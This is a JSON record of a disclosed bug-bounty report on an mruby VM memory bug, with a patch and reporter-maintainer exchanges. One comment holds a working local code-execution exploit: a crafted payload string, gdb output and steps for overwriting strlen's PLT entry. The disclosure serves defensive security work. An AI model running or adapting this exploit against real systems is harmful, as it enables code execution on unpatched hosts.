@@ -1,0 +1,419 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2017-02-28T13:30:02.729Z", 
+    "voters": [
+        "eveeez", 
+        "spetr0x", 
+        "frrrrriend"
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "2000.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 201897, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2017-02-27T23:33:54.201Z", 
+    "vulnerability_information": "The following code produces a segfault without causing a stack overflow, affecting the sandbox:\n\n    def fn(n)\n        return\n        ensure\n            if n == 0\n        else fn(n-1)\n        end\n    end\n    fn(24)\n\nWhen the `n` parameter is less than 24, there is no segfault. However,\ninvestigating with a memory sanitizer shows that uninitialized read errors\nstart to happen when `n >= 15`. The uninitialized read happens at the following\nlocation in vm.c (with the relevant line marked):\n\n```\n1701         cipop(mrb);\n1702         acc = ci->acc;  [***]\n1703         mrb->c->stack = ci->stackent;\n```\n\nThe issue seems to be in using the `ci` data after the call to `cipop`. The following patch stops the read errors and segfaults, and passes make test:\n\n```\ndiff --git a/src/vm.c b/src/vm.c\nindex 9684dab..66fb692 100644\n--- a/src/vm.c\n+++ b/src/vm.c\n@@ -1698,9 +1698,10 @@ RETRY_TRY_BLOCK:\n           mrb->jmp = prev_jmp;\n           return v;\n         }\n-        cipop(mrb);\n+        ci = mrb->c->ci;\n         acc = ci->acc;\n         mrb->c->stack = ci->stackent;\n+        cipop(mrb);\n         if (acc == CI_ACC_SKIP) {\n           mrb->jmp = prev_jmp;\n           return v;\n```", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "low", 
+        "author_type": "User"
+    }, 
+    "title": "Recursion causing uninitialized memory reads leading to a segfault", 
+    "is_member_of_team?": null, 
+    "vote_count": 3, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2017-03-29T23:33:54.232Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$2,000", 
+    "attachments": [
+        {
+            "file_name": "0001-Prevent-use-of-old-pointer-value-possibly-invalidate.patch", 
+            "type": "text/x-diff", 
+            "id": 155829, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/155/829/85727abf1b3f3af82e3292bebe7e145227d66fa5/0001-Prevent-use-of-old-pointer-value-possibly-invalidate.patch?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5B43OTPE%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224253Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDCiDARkX3ArKGaO7%2ByK3A39tqjzyooRkX4qPdNM7MkAemep3r5%2Fh%2B11ZdH6KbZ8q2cgU%2FRMODKRq75fJ6sn%2FkR1fBrPaMFfKsP%2BSLpkSrkbyi968FqbmO6yo59Heb3d1kDMwzaNShj3ou%2Fq9qAc5NWgXlxJtABJqkgxPd5NovxMOsASin8kfBjU8OhOOEnonvd2t16oF509MVoA81P%2Frmr4njIb3UfHzYyccuDQNjHM0qV7B57bCKQeIuO%2FzLl7au%2FWR2v6R6bwK6fGUYVbcnAam9GqobWJnMl6NFbipNSdmUzB5%2BglRYaYeGXxbgxseM7SSFeehfzbywUoHEf4Ve61V1e90uyx3M0Krbm5QjS5gNgwErj0g2rC2mkrl2q%2B9ADfOzgMAX8fUODFalEv4gZf0ZKuLhpmAzEapJE5f%2BarcSkdn5b0ddy4Wa2vdsZ6lQ5NOez8qkcnaBEJZLnv3YGHyInLrIaUkqlq4iavZpr4f5Al5PueqIzLuItn5ztJjfvCu5dDIplWP0eo6r%2BIUCKsDwUNkRSgWCtJbCfl%2BPF3PKHjvnmVEBawLZlpXvaOGUvA%2FKYb2cGGXn89CPjYlwpWCj2J8Z%2B0okbim4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=33c4a87f5d8293527a5d22b5b1ac00a451fc048b7829883f99473f6f81841d6c"
+        }
+    ], 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": true, 
+            "created_at": "2017-01-29T10:18:43.314Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-01-29T10:18:43.314Z", 
+            "actor": {
+                "url": "/shopify-scripts", 
+                "profile": {
+                    "name": "shopify-scripts"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
+                }
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!", 
+            "markdown_message": "<p>Thank you for reporting this bug! This is an automated response to let you know that we&#39;ve received your issue, and we&#39;ll process it as soon as possible.</p>\n\n<p>Due to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1450189, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-01-29T11:19:50.633Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-01-29T11:19:50.633Z", 
+            "actor": {
+                "username": "dgaletic", 
+                "url": "/dgaletic", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "If the above POC doesn't crash the sandbox reliably, try increasing the n parameter (it crashes for me with n = 30). Also, a small correction: the memory errors and segfault are caused by holding onto the old `mrb->c->ci` pointer in the `ci` variable after the calls to `ecall` which sometimes reallocate into a different block. The call to `cipop` needed to be moved so the fix can work because `cipop` modifies `mrb->c->ci`.\n\nThank you,\nDinko Galetic and \nDenis Kasak", 
+            "markdown_message": "<p>If the above POC doesn&#39;t crash the sandbox reliably, try increasing the n parameter (it crashes for me with n = 30). Also, a small correction: the memory errors and segfault are caused by holding onto the old <code>mrb-&gt;c-&gt;ci</code> pointer in the <code>ci</code> variable after the calls to <code>ecall</code> which sometimes reallocate into a different block. The call to <code>cipop</code> needed to be moved so the fix can work because <code>cipop</code> modifies <code>mrb-&gt;c-&gt;ci</code>.</p>\n\n<p>Thank you,<br>\nDinko Galetic and <br>\nDenis Kasak</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1450226, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-01T22:37:34.691Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-01T22:37:34.691Z", 
+            "actor": {
+                "username": "clayton", 
+                "url": "/clayton", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "Thank you for your report. We've reproduced the issue locally, and opened an issue upstream: https://github.com/mruby/mruby/issues/3423", 
+            "markdown_message": "<p>Thank you for your report. We&#39;ve reproduced the issue locally, and opened an issue upstream: <a title=\"https://github.com/mruby/mruby/issues/3423\" href=\"/redirect?signature=0d3b2a4b3633af0d5f7b2cfac26d84d4596e9590&amp;url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fissues%2F3423\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/mruby/mruby/issues/3423</span><i class=\"icon-external-link\"></i></a></p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 1457358, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-03T21:24:47.820Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-03T21:24:47.820Z", 
+            "actor": {
+                "username": "dgaletic", 
+                "url": "/dgaletic", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "Update: This bug can be also be used for remote code execution. We managed to\nexploit mruby by taking control of `regs`, `acc`, `v` and `pc` of the struct\npointed to by `ci` in the `L_RETURN` block of `mrb_vm_exec` to overwrite the\n`strlen` PLT entry. Control of the mentioned variables was achieved by\nallocating large Ruby strings in the ensure loop which eventually end up in the\nmemory deallocated by `realloc`.\n\nThe following code succeeds in exploiting mruby locally for us:\n\n```\ndef f(n)\n    return 32766 + 24239 # 0xdead\n    ensure\n    if n==0\n    else\n        $a = \"AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABYABZABaABbABcABdABeABfABgABhABiABjABkABlABmABnABoABpABqABrABsABtABuABvABwABxAByABzAB1AB2AB3AB4AB5AB6AB7AB8AB9AB0ACBACCACDACEACFACGACHACIACJACKACLACMACNACOACPACQACRACSACTACUACVACWACXACYACZACaACbACcACdACeACfACgAChACiACjACkAClACmACnACoACpACqACrACsACtACuACvACwACxACyACzAC1AC2AC3AC4AC5AC6AC7AC8AC9AC0ADBADCADDADEADFADGADHADIADJADKADLADMADNADOADPADQADRADSADTADUADVADWADXADYADZADaADbADcADdADeADfADgADhADiADjADkADlADmADnADoADpADqADrADsADtADuADvADwADxADyADzAD1AD2AD3AD4AD5AD6AD7AD8AD9AD0AEBAECAEDAEEAEFAEGAEHAEIAEJAEKAELAEMAENAEOAEPAEQAERAESAETAEUAEVAEWAEXAEYAEZAEaAEbAEcAEdAEeAEfAEgAEhAEiAEjAEkAElAEmAEnAEoAEpAEqAErAEsAEtAEuAEvAEwAExAEyAEzAE1AE2AE3AE4AE5AE6AE7AE8AE9AE0AFBAFCAFDAFEAFFAFGAFHAFIAFJAFKAFLAFMAFNAFOAFPAFQAFRAFSAFTAFUAFVAFWAFXAFYAFZAFaAFbAFcAFdAFeAFfAFgAFhAFiAFjAFkAFlAFmAFnAFoAFpAFqAFrAFsAFtAFuAFvAFwAFxAFyAFzAF1AF2AF3AF4AF5AF6AF7AF8AF9AF0AGBAGCAGDAGEAGFAGGAGHAGIAGJAGKAGLAGMAGNAGOAGPAGQAGRAGSAGTAGUAGVAGWAGXAGYAGZAGaAGbAGcAGdAGeAGfAGgAGhAGiAGjAGkAGlAGmAGnAGoAGpAGqAGrAGsAGtAGuAGvAGwAGxAGyAGzAG1AG2AG3AG4AG5AG6AG7AG8AG9AG0AHBAHCAHDAHEAHFAHGAHHAHIAHJAHKAHLAHMAHNAHOAHPAHQAHRAHSAHTAHUAHVAHWAHXAHYAHZAHaAHbAHcAHdAHeAHfAHgAHhAHiAHjAHkAHlAHmAHnAHoAHpAHqAHrAHsAHtAHuAHvAHwAHxAHyAHzAH1AH2AH3AH4AH5AH6AH7AH8AH9AH0AIBAICAIDAIEAIFAIGAIHAIIAIJAIKAILAIMAINAIOAIPAIQAIRAISAITAIUAIVAIWAIXAIYAIZAIaAIbAIcAIdAIeAIfAIgAIhAIiAIjAIkAIlAImAInAIoAIpAIqAIrAIsAItAIuAIvAIwAIxAIyAIzAI1AI2AI3AI4AI5AI6AI7AI8AI9AI0AJBAJCAJDAJEAJFAJGAJHAJIAJJAJKAJLAJMAJNAJOAJPAJQAJRAJSAJTAJUAJVAJWAJXAJYAJZAJaAJbAJcAJdAJeAJfAJgAJhAJiAJjAJkAJlAJmAJnAJoAJpAJqAJrAJsAJtAJuAJvAJwAJxAJyAJzAJ1AJ2AJ3AJ4AJ5AJ6AJ7AJ8AJ9AJ0AKBAKCAKDAKEAKFAKGAKHAKIAKJAKKAKLAKMAKNAKOAKPAKQAKRAKSAKTAKUAKVAKWAKXAKYAKZAKaAKbAKcAKdAK\\xa0\\x40\\x6b\\0\\0\\0\\0\\0KhAKiAKjAKkAKlAKmAKnAKoA\\x08\\xa3\\x70\\0\\0\\0\\0\\0AKsAKtAKuAKv\\0\\0\\0\\0KxAKyAKzAK1AK2AK3AK4AK5AK6AK7AK8AK9AK0ALBALCALDALEALFALGALHALIALJALKALLA\" * 8 if n % 2 == 0\n        String.new(str=\"\")\n        f(n-1)\n    end\nend\nf(122)\n```\n\nRunning the program results in the following segfault, demonstrating control of\n`rip`:\n\n    Program received signal SIGSEGV, Segmentation fault.\n    0x000000000000dead in ?? ()\n\nControlling `regs`, `acc` and `v` in combination allows us to overwrite any 16\nbytes of memory via the following line (`vm.c`, 1715):\n\n    regs[acc] = v;\n\nBy allocating large de Bruijn strings inside the ensure recursion, the bytes\nthat land on each member of the `callinfo` struct are clearly marked. A sample\ngdb output from one of our test runs shows that the value of `stackent` \ncorresponds to the substring \"JmAJnAJo\", `acc` corresponds to \"4AJ5\", and so \non. \n\n    (gdb) print *ci\n    $2 = {mid = 1097353793, proc = 0x416c4a416b4a416a, stackent = \n    0x6f4a416e4a416d4a, nregs = 1097878081, ridx = 1245802826, eidx = 1934246258, \n    env = 0x774a41764a41754a, pc = 0x4a417 94a41784a41, err = 0x41324a41314a417a, \n    argc = 1245786954, acc = 894058804, target_class = 0x4a41374a41364a41}\n\nThese bytes are then set to point the write at a PLT entry for `strlen`:\n\n    00000000006b40a0 R_X86_64_JUMP_SLOT  strlen@GLIBC_2.2.5\n\nNote: This address will obviously be different on a different binary, but\nrunning a bruteforce attack (or having another information disclosure vector)\nwill eventually cause the desired RCE. To demonstrate it on your platform, you\nwould have to look at the output of `objdump -R <mruby binary> | grep strlen`\nand replace our payload substring (see below) with that address.\n\nA small complication is that the returned value `v` gets slightly modified at \nsome point before the assignment if the returned literal is greater than 32766. \nThis can be circumvented by using basic arithmetic, e.g. \n`return 32766 * 215 + 5846` would set `v` to 0x6b9528.\n\nIn the payload string `$a`, the address of the overwritten PLT entry is\nreferenced by the substring `\\xa0\\x40\\x6b\\0\\0\\0\\0\\0`, which ends up as the\nvalue of `regs`, with `acc` being set to 0.\n\nFinally, to make sure `strlen` is called, we set `pc` such that the next\ninstruction executed is `OP_ERR` (opcode number 75), e.g.:\n\n    (gdb) find 0x6c0000,0x7f0000,75\n    0x6c5b34\n    0x6c5de8\n    0x6e4564\n    0x6e6688\n    ***0x70a308***\n    0x70c6eb\n    0x721c10\n    7 patterns found.\n\n    (gdb) x 0x70a308\n    0x70a308:       0x4b\n    (gdb) p 0x4b\n    $130 = 75\n\nThis is the `\\x08\\xa3\\x70\\0\\0\\0\\0\\0` of the payload string. The `OP_ERR` opcode\nwill call `strlen` soon after (`E_RUNTIME_ERROR` -> `mrb_exc_get` ->\n`mrb_class_get_under` -> `class_from_sym` -> `mrb_intern` ->` strlen`).", 
+            "markdown_message": "<p>Update: This bug can be also be used for remote code execution. We managed to<br>\nexploit mruby by taking control of <code>regs</code>, <code>acc</code>, <code>v</code> and <code>pc</code> of the struct<br>\npointed to by <code>ci</code> in the <code>L_RETURN</code> block of <code>mrb_vm_exec</code> to overwrite the<br>\n<code>strlen</code> PLT entry. Control of the mentioned variables was achieved by<br>\nallocating large Ruby strings in the ensure loop which eventually end up in the<br>\nmemory deallocated by <code>realloc</code>.</p>\n\n<p>The following code succeeds in exploiting mruby locally for us:</p>\n<pre class=\"highlight plaintext\"><code>def f(n)\n    return 32766 + 24239 # 0xdead\n    ensure\n    if n==0\n    else\n        $a = &quot;AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABYABZABaABbABcABdABeABfABgABhABiABjABkABlABmABnABoABpABqABrABsABtABuABvABwABxAByABzAB1AB2AB3AB4AB5AB6AB7AB8AB9AB0ACBACCACDACEACFACGACHACIACJACKACLACMACNACOACPACQACRACSACTACUACVACWACXACYACZACaACbACcACdACeACfACgAChACiACjACkAClACmACnACoACpACqACrACsACtACuACvACwACxACyACzAC1AC2AC3AC4AC5AC6AC7AC8AC9AC0ADBADCADDADEADFADGADHADIADJADKADLADMADNADOADPADQADRADSADTADUADVADWADXADYADZADaADbADcADdADeADfADgADhADiADjADkADlADmADnADoADpADqADrADsADtADuADvADwADxADyADzAD1AD2AD3AD4AD5AD6AD7AD8AD9AD0AEBAECAEDAEEAEFAEGAEHAEIAEJAEKAELAEMAENAEOAEPAEQAERAESAETAEUAEVAEWAEXAEYAEZAEaAEbAEcAEdAEeAEfAEgAEhAEiAEjAEkAElAEmAEnAEoAEpAEqAErAEsAEtAEuAEvAEwAExAEyAEzAE1AE2AE3AE4AE5AE6AE7AE8AE9AE0AFBAFCAFDAFEAFFAFGAFHAFIAFJAFKAFLAFMAFNAFOAFPAFQAFRAFSAFTAFUAFVAFWAFXAFYAFZAFaAFbAFcAFdAFeAFfAFgAFhAFiAFjAFkAFlAFmAFnAFoAFpAFqAFrAFsAFtAFuAFvAFwAFxAFyAFzAF1AF2AF3AF4AF5AF6AF7AF8AF9AF0AGBAGCAGDAGEAGFAGGAGHAGIAGJAGKAGLAGMAGNAGOAGPAGQAGRAGSAGTAGUAGVAGWAGXAGYAGZAGaAGbAGcAGdAGeAGfAGgAGhAGiAGjAGkAGlAGmAGnAGoAGpAGqAGrAGsAGtAGuAGvAGwAGxAGyAGzAG1AG2AG3AG4AG5AG6AG7AG8AG9AG0AHBAHCAHDAHEAHFAHGAHHAHIAHJAHKAHLAHMAHNAHOAHPAHQAHRAHSAHTAHUAHVAHWAHXAHYAHZAHaAHbAHcAHdAHeAHfAHgAHhAHiAHjAHkAHlAHmAHnAHoAHpAHqAHrAHsAHtAHuAHvAHwAHxAHyAHzAH1AH2AH3AH4AH5AH6AH7AH8AH9AH0AIBAICAIDAIEAIFAIGAIHAIIAIJAIKAILAIMAINAIOAIPAIQAIRAISAITAIUAIVAIWAIXAIYAIZAIaAIbAIcAIdAIeAIfAIgAIhAIiAIjAIkAIlAImAInAIoAIpAIqAIrAIsAItAIuAIvAIwAIxAIyAIzAI1AI2AI3AI4AI5AI6AI7AI8AI9AI0AJBAJCAJDAJEAJFAJGAJHAJIAJJAJKAJLAJMAJNAJOAJPAJQAJRAJSAJTAJUAJVAJWAJXAJYAJZAJaAJbAJcAJdAJeAJfAJgAJhAJiAJjAJkAJlAJmAJnAJoAJpAJqAJrAJsAJtAJuAJvAJwAJxAJyAJzAJ1AJ2AJ3AJ4AJ5AJ6AJ7AJ8AJ9AJ0AKBAKCAKDAKEAKFAKGAKHAKIAKJAKKAKLAKMAKNAKOAKPAKQAKRAKSAKTAKUAKVAKWAKXAKYAKZAKaAKbAKcAKdAK\\xa0\\x40\\x6b\\0\\0\\0\\0\\0KhAKiAKjAKkAKlAKmAKnAKoA\\x08\\xa3\\x70\\0\\0\\0\\0\\0AKsAKtAKuAKv\\0\\0\\0\\0KxAKyAKzAK1AK2AK3AK4AK5AK6AK7AK8AK9AK0ALBALCALDALEALFALGALHALIALJALKALLA&quot; * 8 if n % 2 == 0\n        String.new(str=&quot;&quot;)\n        f(n-1)\n    end\nend\nf(122)\n</code></pre>\n<p>Running the program results in the following segfault, demonstrating control of<br>\n<code>rip</code>:</p>\n<pre class=\"highlight plaintext\"><code>Program received signal SIGSEGV, Segmentation fault.\n0x000000000000dead in ?? ()\n</code></pre>\n<p>Controlling <code>regs</code>, <code>acc</code> and <code>v</code> in combination allows us to overwrite any 16<br>\nbytes of memory via the following line (<code>vm.c</code>, 1715):</p>\n<pre class=\"highlight plaintext\"><code>regs[acc] = v;\n</code></pre>\n<p>By allocating large de Bruijn strings inside the ensure recursion, the bytes<br>\nthat land on each member of the <code>callinfo</code> struct are clearly marked. A sample<br>\ngdb output from one of our test runs shows that the value of <code>stackent</code> <br>\ncorresponds to the substring &quot;JmAJnAJo&quot;, <code>acc</code> corresponds to &quot;4AJ5&quot;, and so <br>\non. </p>\n<pre class=\"highlight plaintext\"><code>(gdb) print *ci\n$2 = {mid = 1097353793, proc = 0x416c4a416b4a416a, stackent = \n0x6f4a416e4a416d4a, nregs = 1097878081, ridx = 1245802826, eidx = 1934246258, \nenv = 0x774a41764a41754a, pc = 0x4a417 94a41784a41, err = 0x41324a41314a417a, \nargc = 1245786954, acc = 894058804, target_class = 0x4a41374a41364a41}\n</code></pre>\n<p>These bytes are then set to point the write at a PLT entry for <code>strlen</code>:</p>\n<pre class=\"highlight plaintext\"><code>00000000006b40a0 R_X86_64_JUMP_SLOT  strlen@GLIBC_2.2.5\n</code></pre>\n<p>Note: This address will obviously be different on a different binary, but<br>\nrunning a bruteforce attack (or having another information disclosure vector)<br>\nwill eventually cause the desired RCE. To demonstrate it on your platform, you<br>\nwould have to look at the output of <code>objdump -R &lt;mruby binary&gt; | grep strlen</code><br>\nand replace our payload substring (see below) with that address.</p>\n\n<p>A small complication is that the returned value <code>v</code> gets slightly modified at <br>\nsome point before the assignment if the returned literal is greater than 32766. <br>\nThis can be circumvented by using basic arithmetic, e.g. <br>\n<code>return 32766 * 215 + 5846</code> would set <code>v</code> to 0x6b9528.</p>\n\n<p>In the payload string <code>$a</code>, the address of the overwritten PLT entry is<br>\nreferenced by the substring <code>\\xa0\\x40\\x6b\\0\\0\\0\\0\\0</code>, which ends up as the<br>\nvalue of <code>regs</code>, with <code>acc</code> being set to 0.</p>\n\n<p>Finally, to make sure <code>strlen</code> is called, we set <code>pc</code> such that the next<br>\ninstruction executed is <code>OP_ERR</code> (opcode number 75), e.g.:</p>\n<pre class=\"highlight plaintext\"><code>(gdb) find 0x6c0000,0x7f0000,75\n0x6c5b34\n0x6c5de8\n0x6e4564\n0x6e6688\n***0x70a308***\n0x70c6eb\n0x721c10\n7 patterns found.\n\n(gdb) x 0x70a308\n0x70a308:       0x4b\n(gdb) p 0x4b\n$130 = 75\n</code></pre>\n<p>This is the <code>\\x08\\xa3\\x70\\0\\0\\0\\0\\0</code> of the payload string. The <code>OP_ERR</code> opcode<br>\nwill call <code>strlen</code> soon after (<code>E_RUNTIME_ERROR</code> -&gt; <code>mrb_exc_get</code> -&gt;<br>\n<code>mrb_class_get_under</code> -&gt; <code>class_from_sym</code> -&gt; <code>mrb_intern</code> -&gt;<code>strlen</code>).</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1461755, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "dgaletic", 
+                "url": "/dgaletic"
+            }, 
+            "created_at": "2017-02-08T14:54:26.313Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-08T14:54:26.313Z", 
+            "actor": {
+                "username": "clayton", 
+                "url": "/clayton", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
+            "message": "Thanks again for your report. The patch was accepted upstream in https://github.com/mruby/mruby/commit/f3d4ff16d39b34585d41c31ffc09a0ffb512ff81\n\nSo that we can validate the RCE proof-of-concept, could you please provide the full details of what git SHA of mruby (and/or mruby-engine) you tested that on, what compiler you used to build it, what operating system you built on, how you launched the debugger, etc.? Thanks!\n\nOur next round of bounty decisions will take place in about two weeks, so we'll be in touch with you again soon.", 
+            "markdown_message": "<p>Thanks again for your report. The patch was accepted upstream in <a title=\"https://github.com/mruby/mruby/commit/f3d4ff16d39b34585d41c31ffc09a0ffb512ff81\" href=\"/redirect?signature=451ef3a4b4008518a8db697d2f03bd4f54014ad6&amp;url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fcommit%2Ff3d4ff16d39b34585d41c31ffc09a0ffb512ff81\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/mruby/mruby/commit/f3d4ff16d39b34585d41c31ffc09a0ffb512ff81</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>So that we can validate the RCE proof-of-concept, could you please provide the full details of what git SHA of mruby (and/or mruby-engine) you tested that on, what compiler you used to build it, what operating system you built on, how you launched the debugger, etc.? Thanks!</p>\n\n<p>Our next round of bounty decisions will take place in about two weeks, so we&#39;ll be in touch with you again soon.</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 1471339, 
+            "genius_execution_id": null
+        }, 
+        {
+            "attachments": [
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/160/943/cf48211647b0c0f464116dbc82db0a11dbb83ca7/payload-updated?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5B43OTPE%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224253Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDCiDARkX3ArKGaO7%2ByK3A39tqjzyooRkX4qPdNM7MkAemep3r5%2Fh%2B11ZdH6KbZ8q2cgU%2FRMODKRq75fJ6sn%2FkR1fBrPaMFfKsP%2BSLpkSrkbyi968FqbmO6yo59Heb3d1kDMwzaNShj3ou%2Fq9qAc5NWgXlxJtABJqkgxPd5NovxMOsASin8kfBjU8OhOOEnonvd2t16oF509MVoA81P%2Frmr4njIb3UfHzYyccuDQNjHM0qV7B57bCKQeIuO%2FzLl7au%2FWR2v6R6bwK6fGUYVbcnAam9GqobWJnMl6NFbipNSdmUzB5%2BglRYaYeGXxbgxseM7SSFeehfzbywUoHEf4Ve61V1e90uyx3M0Krbm5QjS5gNgwErj0g2rC2mkrl2q%2B9ADfOzgMAX8fUODFalEv4gZf0ZKuLhpmAzEapJE5f%2BarcSkdn5b0ddy4Wa2vdsZ6lQ5NOez8qkcnaBEJZLnv3YGHyInLrIaUkqlq4iavZpr4f5Al5PueqIzLuItn5ztJjfvCu5dDIplWP0eo6r%2BIUCKsDwUNkRSgWCtJbCfl%2BPF3PKHjvnmVEBawLZlpXvaOGUvA%2FKYb2cGGXn89CPjYlwpWCj2J8Z%2B0okbim4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=062871ff5ba3f5f96a698fdea93480eacf8c482df4a13be7c5a03555222a33ca", 
+                    "type": "text/plain", 
+                    "id": 160943, 
+                    "filename": "payload-updated"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2017-02-14T23:53:28.262Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-14T23:53:28.262Z", 
+            "actor": {
+                "username": "dgaletic", 
+                "url": "/dgaletic", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "shopify-scripts", 
